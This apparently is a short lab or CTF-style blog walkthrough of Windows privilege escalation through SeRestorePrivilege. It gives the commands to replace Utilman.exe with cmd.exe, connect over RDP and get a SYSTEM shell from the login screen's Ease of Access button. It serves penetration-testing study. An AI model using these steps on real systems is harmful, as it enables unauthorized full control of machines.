+++
date = '2026-04-18T14:48:27+09:00'
draft = false
title = 'Serestoreprivilege'
+++

# SeRestorePrivilege

When an account has SeRestorePrivilege, it can be leveraged to achieve privilege escalation by overwriting protected system files.

1. Obtain the required script

Download the following script, which enables the privilege in the current session: 

[script](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1) file.

2. Enable the privilege and replace Utilman

Execute the script and abuse the privilege to replace Utilman.exe with cmd.exe:

```powershell
.\EnableSeRestorePrivilege.ps1
ren C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.pwned
ren C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

This works because SeRestorePrivilege allows bypassing file permissions when writing to system locations.

3. Connect via RDP

From a Linux machine, connect to the target using RDP:

```bash
rdesktop <target IP>
```

4. Trigger SYSTEM shell

On the login screen, click the **Ease of Access** button.
Since Utilman.exe has been replaced, this will launch **cmd.exe** with SYSTEM privileges.

![priv](/images/heist/privesc-2.png)